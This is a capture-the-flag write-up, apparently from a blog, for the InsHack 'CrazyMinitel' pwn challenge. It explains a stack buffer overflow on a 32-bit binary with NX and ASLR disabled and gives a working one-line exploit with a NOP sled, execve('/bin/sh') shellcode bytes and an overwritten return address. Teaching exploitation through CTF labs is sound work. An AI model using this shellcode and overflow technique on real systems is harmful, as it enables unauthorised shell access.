---
title: "InsHack -- CrazyMinitel Writeup"
categories:
  - InsHack
tags:
  - CTF
  - pwn
---

> My minitel has gone crazy! Help me please you kind stranger!

<div class="notice--info">
<strong>Name</strong>: CrazyMinitel<br>
<strong>Category</strong>: pwn<br>
<strong>Points</strong>: 125<br>
<strong>Solves</strong>: 77<br>
<strong>Given</strong>: <code>crazy-minitel</code><br> <!-- Link the files here to my repository with it -->
</div>


## Checksec
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled       (<- we CAN use shellcode)
    PIE:      No PIE
    ASLR:     DISABLED          (<- we CAN realiably know where the stack is)


# Solution
The program just echos the input. If the input is large enought the buffer is overflowed, so, since we can use shellcode lets just return to our buffer in the stack and run `execve("/bin/sh", NULL, NULL)`. <br><br>
We can realiably return to our buffer because we can first get its location in gdb and we know it wont change since ASLR is disabled. (It might change a little bit since environment variables are stored on the stack and if for example you change directory, $PWD will have a different value and shift the stack arround) <br>
To bypass that we use a **nop sled**. A nop sled it just a bunch of nops (assembly instruction for no operation, aka does nothing), making it possible for us to jump to anywhere in the nop sled range and execute our shellcode regardless of jumping perfectly to the start of our shellcode or anywhere in the NOPS.

The solution is simply:
 - We send `nop..nop..nop...shellcode` for a total length of 230.
 - Than we send `A`'s to pad until we get to the point on the stack where we are about to overwrite the `saved EIP`.
 - Ovewrite the `saved EIP` with a value pointing to somewhere in the middle of the nops (find this in gdb). In this case it was `0xbffffaa0`. We write it as `\xa0\xfa\xff\xbf` because the bytes are stored in little endian.

```
./vuln $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'.rjust(230,'\x90') + 'A'*(268-230) + '\xa0\xfa\xff\xbf'")
```